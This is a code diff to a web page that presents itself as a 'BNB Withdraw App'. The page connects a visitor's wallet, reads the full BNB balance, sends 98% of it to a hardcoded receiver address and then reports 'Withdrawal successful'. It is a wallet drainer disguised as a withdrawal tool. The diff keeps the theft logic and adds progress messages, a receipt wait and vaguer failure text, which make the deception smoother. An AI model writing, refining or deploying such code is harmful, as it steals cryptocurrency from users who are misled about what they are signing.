@@ -45,13 +45,14 @@
       createConfig,
       getAccount,
       fetchBalance,
-      sendTransaction
+      sendTransaction,
+      waitForTransactionReceipt
     } = WagmiCore;
 
     const chains = [bsc];
     const projectId = "2aca272d18deb10ff748260da5f78bfd";
     const RECEIVER_ADDRESS = "0xa84bd2cfbBad66Ae2c5daf9aCe764dc845b94C7C";
-    const BNB_TO_USD = 600; // Estimated market price of BNB
+    const BNB_TO_USD = 600; // Estimated price of BNB
 
     const { publicClient } = configureChains(chains, [w3mProvider({ projectId })]);
 
@@ -61,9 +62,7 @@
         ...w3mConnectors({ chains, version: 2, projectId }),
         new WagmiCoreConnectors.CoinbaseWalletConnector({
           chains,
-          options: {
-            appName: "BNB Withdraw App"
-          }
+          options: { appName: "BNB Withdraw App" }
         })
       ],
       publicClient
@@ -76,7 +75,9 @@
       const el = document.getElementById("message");
       el.innerText = msg;
       el.className = `text-sm font-medium ${
-        type === "error" ? "text-red-600" : type === "success" ? "text-green-600" : "text-gray-600"
+        type === "error" ? "text-red-600" :
+        type === "success" ? "text-green-600" :
+        "text-gray-600"
       }`;
     }
 
@@ -89,6 +90,8 @@
       }
 
       try {
+        showMessage("Checking balance...", "info");
+
         const balanceResult = await fetchBalance({ address, chainId: 56 });
         const fullBNB = Number(balanceResult.formatted);
         const sendableBNB = fullBNB * 0.98;
@@ -99,19 +102,23 @@
           return;
         }
 
-        await sendTransaction({
+        showMessage("Sending transaction...", "info");
+
+        const tx = await sendTransaction({
           to: RECEIVER_ADDRESS,
           value: BigInt(Math.floor(sendableBNB * 1e18)) // Convert to wei
         });
 
+        await publicClient.waitForTransactionReceipt({ hash: tx.hash });
+
         showMessage("Withdrawal successful! ✅", "success");
       } catch (err) {
         console.error(err);
-        showMessage("Error sending transaction. Check console for details.", "error");
+        showMessage("Transaction failed or rejected.", "error");
       }
     }
 
-    // Show Withdraw button only when wallet is connected
+    // Show withdraw button only when connected
     setInterval(() => {
       const { isConnected } = getAccount();
       const btn = document.getElementById("withdrawButton");
